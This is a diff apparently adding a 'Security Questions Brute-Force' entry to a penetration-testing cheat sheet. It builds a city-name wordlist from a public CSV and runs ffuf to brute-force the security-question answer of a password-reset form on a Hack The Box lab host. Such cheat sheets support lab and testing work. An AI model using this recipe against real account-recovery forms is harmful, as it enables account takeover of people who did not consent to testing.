@@ -1150,6 +1150,14 @@ https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credent
 https://github.com/scadastrangelove/SCADAPASS/tree/master
 ```
 
+- Security Questions Brute-Force
+
+```
+https://github.com/datasets/world-cities/blob/master/data/world-cities.csv
+$ cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
+$ ffuf -w ./city_wordlist.txt -u http://pwreset.htb/security_question.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=39b54j201u3rhu4tab1pvdb4pv" -d "security_response=FUZZ" -fr "Incorrect response."
+```
+
 #19. - Sensitive Data Exposure
 -----------------------------------------
 
